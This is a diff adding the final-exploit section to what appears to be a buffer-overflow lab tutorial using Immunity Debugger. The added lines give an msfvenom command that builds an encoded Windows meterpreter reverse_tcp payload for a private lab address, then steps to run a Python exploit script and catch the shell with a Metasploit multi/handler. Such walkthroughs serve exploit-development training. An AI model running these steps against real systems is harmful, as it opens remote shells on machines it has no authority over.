@@ -128,6 +128,38 @@ Check if your EIP is at 625011AF , Now beside the pause button there button in w
 
 TIME TO WRITE THE FINAL EXPLOIT !!
 
+We need our payload , get it with this 
+```sh
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.242.128 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f c
+```
+
+Paste the payload in script as per `exploit_final.py`
+
+CLOSE THE IMMUNITY DEBUGGER 
+OPEN CMD AND OPEN THE EXE FILE AS WE DID AT START
+
+In kali run your `exploit_final.py` with python2
+
+Do all these steps 
+```sh
+python2 exploit_final.py
+```
+```sh
+msfconsole
+```
+```sh
+use/exploit/multi/handler
+```
+```sh
+set payload windows/meterpreter/reverse_tcp
+```
+```sh
+set lhost <kali ip>
+```
+```sh
+run
+```
+
 
 
 
